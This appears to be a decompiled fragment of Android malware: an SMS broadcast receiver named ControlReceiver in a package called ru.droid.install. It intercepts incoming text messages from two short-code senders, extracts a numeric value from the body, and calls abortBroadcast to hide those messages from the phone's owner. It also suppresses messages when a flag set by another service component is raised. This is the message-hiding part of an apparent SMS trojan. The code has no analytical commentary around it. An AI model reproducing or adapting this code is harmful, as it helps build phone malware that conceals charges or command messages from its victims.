	public static java.lang.String a
	
	    static ControlReceiver()
	    {
	        ru.droid.install.other.ControlReceiver.a = "0";
	        return;
	    }
	
	
	    public ControlReceiver()
	    {
	        return;
	    }
	
	
	    public void onReceive(android.content.Context p7, android.content.Intent p8)
	    {
	        Object[] v0_0 = p8.getExtras();
	        if (v0_0 != null) {
	            Object[] v0_2 = ((Object[]) v0_0.get("pdus"));
	            android.telephony.gsm.SmsMessage[] v4 = new android.telephony.gsm.SmsMessage[v0_2.length];
	            int v2 = 0;
	            while (v2 < v4.length) {
	                v4[v2] = android.telephony.gsm.SmsMessage.createFromPdu(((byte[]) v0_2[v2]));
	                if ((v4[v2].getOriginatingAddress().contains("088011")) || (v4[v2].getOriginatingAddress().contains("000100"))) {
	                    int v1_14 = java.util.regex.Pattern.compile("-?\\d+").matcher(v4[v2].getDisplayMessageBody());
	                    if (v1_14.find()) {
	                        ru.droid.install.other.ControlReceiver.a = v1_14.group();
	                        this.abortBroadcast();
	                    }
	                }
	                if (ru.droid.install.system.AndroidService.c) {
	                    this.abortBroadcast();
	                    ru.droid.install.system.AndroidService.c = 0;
	                }
	                v2++;
	            }
	        }
	        return;
	    }
	
